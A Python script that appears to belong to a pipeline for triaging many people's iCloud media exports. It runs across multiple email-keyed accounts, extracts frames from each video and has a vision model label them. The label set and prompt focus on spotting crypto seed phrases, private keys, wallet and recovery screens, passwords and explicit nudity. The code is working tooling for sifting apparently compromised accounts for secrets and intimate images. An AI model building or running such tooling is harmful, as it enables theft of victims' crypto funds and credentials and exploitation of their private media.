#!/usr/bin/env python3
"""Give every video a thumbnail and a VLM label from its own frames.

A video has no pixels for the panel and no label for the search filter until
someone reads it.  This does both in one pass:

    frames     first frame (at 1 s) and the frame at 50 % of the duration
    thumbnail  the middle frame, 640 px, saved to Scan/thumbs/<rel>.jpg — the
               same path the grid already asks for, so the tile shows a real
               picture instead of a play icon
    label      the two frames side by side in one image, sent to Qwen3.5-4B
               with the taxonomy prompt; one label per video, written to the
               same results.jsonl the photos use

Resumable: a video whose result is already "ok" is skipped; a missing
thumbnail is still rebuilt on the next run.

    classify_video.py --account x@y.com [--workers 24] [--limit N]
    classify_video.py --all [--workers 24]
"""
from __future__ import annotations

import argparse
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import classify as core  # noqa: E402
import classify_all as ca  # noqa: E402
from classify_all import rclone_copy  # noqa: E402

VIDEO_EXT = {".mov", ".mp4", ".m4v", ".3gp", ".avi", ".mkv", ".webm", ".mpg", ".mpeg"}

VIDEO_PROMPT = (
    "These are two frames from one video (the start and the middle). "
    "Label the VIDEO with exactly one of these labels:\n"
    "seed, seed-candidate, privatekey, wallet, recover, exchange, ledger, trezor, "
    "safe, backup, password, account, crypto, screenshot, text, document, receipt, "
    "nude, selfie, person, photo, meme, other, unknown\n"
    "Rules: a screen recording of a wallet/seed/recovery screen gets that label "
    "(a numbered list of lowercase words = seed or seed-candidate). A video of "
    "people is person, a close-up of a face is selfie, explicit nudity is nude. "
    "Otherwise photo.\n"
    "Answer with the label only, no punctuation.\nLabel:"
)

FFMPEG = None
_FF_LOCK = threading.Lock()
_WORK = Path(tempfile.gettempdir()) / "icloud3-video"
_WORK.mkdir(parents=True, exist_ok=True)


def log(message: str) -> None:
    print(time.strftime("%H:%M:%S ") + message, flush=True)


def ffmpeg() -> str:
    global FFMPEG
    if FFMPEG is None:
        import imageio_ffmpeg

        FFMPEG = imageio_ffmpeg.get_ffmpeg_exe()
    return FFMPEG


def duration_of(path: Path) -> float:
    process = subprocess.run(
        [ffmpeg(), "-hide_banner", "-i", str(path)],
        capture_output=True, text=True, timeout=60,
    )
    match = re.search(r"Duration:\s*(\d+):(\d+):(\d+(?:\.\d+)?)", process.stderr)
    if not match:
        return 0.0
    hours, minutes, seconds = match.groups()
    return int(hours) * 3600 + int(minutes) * 60 + float(seconds)


def grab(path: Path, at: float, target: Path, side: int = 640) -> bool:
    with _FF_LOCK:
        process = subprocess.run(
            [ffmpeg(), "-y", "-loglevel", "error", "-ss", f"{max(0.0, at):.2f}",
             "-i", str(path), "-frames:v", "1", "-vf", f"scale={side}:-2",
             "-q:v", "4", str(target)],
            capture_output=True, text=True, timeout=120,
        )
    return target.is_file() and target.stat().st_size > 0


def montage(first: Path, middle: Path, target: Path) -> bool:
    from PIL import Image

    try:
        with Image.open(first) as a, Image.open(middle) as b:
            a = a.convert("RGB")
            b = b.convert("RGB")
            height = min(a.height, b.height)
            def fit(image):
                width = max(1, int(image.width * height / image.height))
                return image.resize((width, height))
            a, b = fit(a), fit(b)
            canvas = Image.new("RGB", (a.width + b.width, height), "black")
            canvas.paste(a, (0, 0))
            canvas.paste(b, (a.width, 0))
            canvas.thumbnail((896, 448))
            buffer = io.BytesIO()
            canvas.save(buffer, "JPEG", quality=88)
        target.write_bytes(buffer.getvalue())
        return True
    except Exception:  # noqa: BLE001
        return False


def videos_local(root: Path) -> list[Path]:
    found: list[Path] = []
    for base, dirs, names in os.walk(root):
        dirs[:] = [d for d in dirs if d not in ("Scan", "zips", ".thumbnails")]
        for name in names:
            if name.endswith((".part", ".tmp")):
                continue
            if Path(name).suffix.lower() in VIDEO_EXT:
                found.append(Path(base) / name)
    return found


def videos_bucket(email: str, root: Path) -> list[str]:
    manifest = root / "Scan" / "s4-manifest.json"
    rels: list[str] = []
    if manifest.is_file():
        try:
            payload = json.loads(manifest.read_text())
            files = payload.get("files") if isinstance(payload, dict) else payload
            for item in files:
                rel = str(item.get("p") if isinstance(item, dict) else item)
                if Path(rel).suffix.lower() in VIDEO_EXT:
                    rels.append(rel)
        except Exception:  # noqa: BLE001
            pass
    return rels


def run_account(email: str, root: Path, classifier: core.Classifier, writer, index: int,
                total_accounts: int, workers: int, limit: int, counter: dict) -> None:
    local = videos_local(root)
    seen = {path.relative_to(root).as_posix() for path in local}
    bucket = [rel for rel in videos_bucket(email, root) if rel not in seen]
    log(f"{email}: {len(local)} videos on disk · {len(bucket)} only in S4")
    if limit:
        local = local[:limit]

    stage = ca.STAGE / f"video-{email}"
    if bucket:
        rclone_copy(email, bucket[:limit or len(bucket)], stage)

    items: list[tuple[str, Path]] = [(f"{email}/{p.relative_to(root).as_posix()}", p) for p in local]
    for rel in (bucket[:limit] if limit else bucket):
        staged = stage / email / rel
        if staged.is_file() and staged.stat().st_size > 0:
            items.append((f"{email}/{rel}", staged))

    done = core.load_results(ca.RESULTS)
    todo = [item for item in items if (done.get(item[0]) or {}).get("status") != "ok"]
    log(f"{email}: {len(items)} videos · {len(todo)} to label")
    if not todo:
        return
    counter["total"] = counter["done"] + len(todo)

    def work(item: tuple[str, Path]) -> None:
        rel_path, path = item
        started = time.time()
        slug = str(abs(hash(rel_path)))
        first = _WORK / f"{slug}-first.jpg"
        middle = _WORK / f"{slug}-mid.jpg"
        combined = _WORK / f"{slug}-pair.jpg"
        thumb = root / "Scan" / "thumbs" / f"{Path(rel_path.split('/', 1)[1]).as_posix()}.jpg"
        try:
            seconds = duration_of(path)
            ok_first = grab(path, min(1.0, seconds * 0.1 if seconds else 1.0), first)
            ok_mid = grab(path, (seconds * 0.5) if seconds else 1.0, middle)
            if not ok_first and not ok_mid:
                grab(path, 0.0, first)
                ok_first = first.is_file()
            if not (ok_first or ok_mid):
                raise RuntimeError("no-frame")
            if not thumb.is_file():
                thumb.parent.mkdir(parents=True, exist_ok=True)
                source = middle if ok_mid else first
                try:
                    thumb.write_bytes(source.read_bytes())
                except OSError:
                    pass
            pair = combined if (ok_first and ok_mid and montage(first, middle, combined)) else (
                middle if ok_mid else first)
            row = classifier.classify(rel_path, pair, prompt=VIDEO_PROMPT)
            row["kind"] = "video"
            row["duration"] = round(seconds, 1)
        except Exception as error:  # noqa: BLE001
            row = {"rel_path": rel_path, "label": "", "status": "error",
                   "error": f"video:{type(error).__name__}", "ms": int((time.time() - started) * 1000),
                   "model": classifier.model, "kind": "video"}
        finally:
            for path_ in (first, middle, combined):
                try:
                    path_.unlink()
                except OSError:
                    pass
        with counter["lock"]:
            writer.write(row)
            counter["done"] += 1
            if row["status"] == "ok":
                counter["ok"] += 1
            else:
                counter["failed"] += 1
            if counter["done"] % 40 == 0 or counter["done"] == counter["total"]:
                log(f"[{index}/{total_accounts}] {counter['done']}/{counter['total']} · "
                    f"ok {counter['ok']} · failed {counter['failed']} · {email}")

    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        list(pool.map(work, todo))


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--account", default="")
    parser.add_argument("--all", action="store_true")
    parser.add_argument("--workers", type=int, default=24)
    parser.add_argument("--limit", type=int, default=0, help="videos per account")
    parser.add_argument("--decode-workers", type=int, default=6)
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    args = parser.parse_args()

    accounts = ca.account_roots()
    if args.account:
        if args.account not in accounts:
            parser.error(f"no export directory for {args.account}")
        chosen = {args.account: accounts[args.account]}
    elif args.all:
        chosen = accounts
    else:
        parser.error("--account or --all")

    core._DECODE = threading.BoundedSemaphore(max(1, args.decode_workers))
    classifier = core.Classifier(args.base_url, args.model)
    writer = ca.Writer(ca.RESULTS)
    counter = {"done": 0, "ok": 0, "failed": 0, "total": 0,
               "lock": threading.Lock()}
    started = time.time()
    try:
        for index, (email, root) in enumerate(sorted(chosen.items()), 1):
            run_account(email, root, classifier, writer, index, len(chosen),
                        args.workers, args.limit, counter)
    finally:
        writer.close()
    log(f"done · {counter['ok']} labels · {counter['failed']} failed · "
        f"{time.time() - started:.0f}s")


if __name__ == "__main__":
    main()
